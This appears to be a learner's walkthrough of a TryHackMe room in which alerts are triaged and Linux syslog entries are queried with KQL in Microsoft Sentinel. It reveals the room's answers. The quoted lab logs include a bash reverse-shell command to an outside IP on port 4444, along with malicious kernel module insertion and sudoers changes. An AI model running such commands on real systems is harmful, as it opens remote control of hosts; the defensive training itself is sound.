# ROOM 10 - SOC Alert Triaging - Tinsel Triage (httpbnry)

The context of this room is **the following:**

The Best Festival Company’s Security Operations Center is overwhelmed by a sudden surge of alerts across its cloud environment. As alerts flood in and tension rises, the team suspects the return of the evil Easter Bunnies—but their motive and point of entry are unclear.  

This scenario focuses on:
- The importance of effective alert triage and prioritisation 
- Using Microsoft Sentinel to review and analyse security alerts 
- Correlating logs to distinguish real threats from noise and determine accurate alert verdicts 

## CONNECTION

In this room, *TryHackMe* tells us to login to **Microsoft Azure** via a list of access pass combinations, based on continents.

So head to ![Mirosoft Azure](https://portal.azure.com/) and enter with one of their passes.

---

## TASK 2 - ALert Triaging Alerts

McSkidy is alerted to a surge of suspicious activity across the Azure tenant, with dashboards lighting up and signs pointing to a possible attack by the Evil Bunnies. With the Best Festival Company’s operations at risk, the SOC must respond quickly—but not every alert signals real danger.

Alert triaging is essential to separate noise from genuine threats. Instead of investigating every alert immediately, analysts prioritise based on four key factors:
- **Severity**: How serious is the alert?
- **Time**: When did it occur and is it recurring?
- **Context**: Which stage of the attack lifecycle does it represent?
- **Impact**: Which assets, users, or systems are affected?

Using these dimensions allows the SOC to decide whether to escalate, investigate further, or close an alert as a false positive.

Once high-priority alerts are identified, analysts dive deeper by reviewing alert details, examining related logs, correlating multiple alerts, and building a timeline of events. This process helps determine whether an attack is ongoing, contained, or benign. Clear documentation of findings and lessons learned ensures continuous improvement and prepares the team to uncover the bigger picture behind the alert storm.

---

## TASK 3 - Eviroment Review

In **Microsoft Azure** lets head search "*Microsoft Sentinel*" and click on it. Then go to the *Sentinel instance* (in my case `law-aoc2025`) and then to the **General --> logs** tab. After that select the **custom log table named `Syslog_CL`**.

> Sometimes you might need to close some pop ups.

Ok, now when you're in the following page, on the left side we click on **Tables**.

[screenshot1](./screenshot1.png)

Then, we open *Custom Logs* and then we click on `Syslog_CL`, then we hit **Run**.

> You might need to change the time range to before the 12/12/2025. 

Now we can see all the logs that we are going to triage.

---

## TASK 4 - Investigation Proper.

With alert triaging covered, it’s time to move into the Best Festival Company’s SOC environment in Azure. Here, McSkidy puts her skills into action using **Microsoft Sentinel**, a cloud-native SIEM and SOAR platform.

Microsoft Sentinel collects and correlates data from Azure services, applications, and connected data sources to detect, investigate, and respond to threats in near real time. Through Sentinel, analysts can view and manage alerts, analyse incidents, and pivot across multiple log sources to build context quickly.

In this next phase, McSkidy uses Sentinel’s investigation tools to review alerts, examine evidence, and connect related activities—uncovering the truth behind the Evil Bunnies’ attack within the Azure tenant.

### MICROSOFT SENTINEL IN ACTION

Now we are going to head to **Microsoft Sentinel --> Our Sentinel Instance --> Threat Management --> Incidents**.

> This is what the room says, in my case i needed to head to ![Microsoft Defender](https://security.microsoft.com/incidents?)

[screenshot2](./screenshot2.png)

Lets start assesing the **Linux PrivEsc—Kernel Module Insertion**, by clicking on it, in my case i had to search it up. 

When we enter we see the following:

[screenshot3](./screenshot3.png)

Sentinel Incident: Kernel Module Insertion

Upon checking the alert, as seen in the above image, the following details can be initially inferred:

- There are three events related to the alert.
- The alert was recently created (note that this varies based on your lab instance).
- There are three entities involved in the alert.
- The alert is classified as a Privilege Escalation tactic.

Several detections point to the same affected entities. This overlap helps reveal relationships between alerts and suggests a possible sequence of events impacting the same host, user, or IP address.

When multiple alerts are tied to a single entity, they are often not isolated incidents but different stages of the same intrusion. By identifying shared entities, analysts can begin tracing the attack path—from initial access through privilege escalation and persistence.

**Example attack progression on a single VM:**
- **Root SSH Login from External IP**: Indicates initial remote access.
- **SUID Discovery**: Suggests an attempt to escalate privileges.
- **Kernel Module Insertion**: Points to persistence through a malicious kernel module.

At this point, McSkidy has reviewed high-severity alerts, identified affected entities, and recognised that multiple detections are linked as part of a broader compromise. This initial triage enables effective prioritisation and sets the stage for deeper analysis of the underlying logs, covered in the next task.

### QUESTIONS.

In the microsoft defender, we can easily answer the 3 questions by just seeing the different columns of the many incidents.

---

## TASK 4 - In-Depth Log Analysis with Sentinel

With the initial triage complete, McSkidy now examines the raw evidence behind these alerts. The next task involves diving into the underlying log data within Microsoft Sentinel to validate the alerts and uncover the exact attacker actions that triggered them. By analysing authentication attempts, command executions, and system changes, McSkidy can begin piecing together the full story of how the attack unfolded.

If we go to **Investigation and Response --> Incidents and Alerts --> Alerts --> Linux PrivEsc - Kernel Module Insertion --> Open Alert Page** and scroll down, we can see the full **Query Results**

[screenshot4](./screenshot4.png)

From this view, we can definitely see the actual name of the kernel module installed in each machine and the time it was installed.

Now we head back to the **Microsoft Sentinel Logs page** and put in the following code (so we can see al the events related with `app-02`.):

> IMPORTANT: CHANGE THE MODE FROM SIMPLE TO **KQL MODE**.

```
set query_now = datetime(2025-10-30T05:09:25.9886229Z);
Syslog_CL
| where host_s == 'app-02'
| project _timestamp_t, host_s, Message
```

After executing the query, it can be seen that multiple potentially suspicious events occurred around the installation of the kernel module.

- Execution of the cp (copy) command to create a shadow file backup.
- Addition of the user account Alice to the sudoers group.
- Modification of the backupuser account by root.
- Insertion of the malicious_mod.ko module.
- Successful SSH authentication by the root user.

[screenshot5](./screenshot5.png)

Based on the surrounding events, including the execution of the cp command to create a shadow file backup, the addition of the user account Alice to the sudoers group, the modification of the backupuser account by root, and the successful SSH authentication by the root user, this activity appears highly unusual. The sequence suggests potential privilege escalation and persistence behaviour, indicating that the event may not be part of normal system operations and warrants further investigation.

### QUESTIONS

**NUM 1:** This question can be resolved by checking the logs of the `websrv-01`, this is reached by replacing the `host_s` with `websrv-01`.

Lets hit **run** and take a look at the logs.

one of the logs is:

`kernel: [625465] audit: type=1130 audit(1759996669:1161): id=622 op=insert_module name=malicious_mod.ko uid=0`

The name of the module is: <details>
<summary>Click to reveal</summary>

malicious_mod.ko

</details>

**NUM 2:** In the same logs, theres the following:

`sudo:   ops : TTY=pts/0 ; PWD=/home/ops ; USER=root ; COMMAND=/bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1`

Here the command is clearly shown. Lets insert it to TryHackMe.

**NUM 3:** In this one, we need to change the query to search, to make the `host_s` to `storage-01`.

Here in the logs, the following appears.

`sshd[3496]: Accepted password for root from 172.16.0.12 port 12020 ssh2`

Here we have the answer to the question.

**NUM 4:** In this one, we have to change the query back to `app-01`.

In the logs we have the following.

`sshd[6978]: Accepted password for root from 203.0.113.45 port 64978 ssh2`

> Note, its not the 10.1.1.5 because this is a **Local IP** and it asks for a external ip.

**NUM 5:** Lastly, this logs shows up.

`usermod: user 'deploy' added to group 'sudo' by uid=0 (usermod -aG sudo deploy)`

This says the answer.

---

## SUMMARY / FEEDBACK

- I really like this room, i love how Microsoft Sentinel works and i find it very interesting how its capable to connect incidents.

- The only think i didnt like is that its not updated/or maybe this was a problem i had that i had to go to microsoft defender.
 
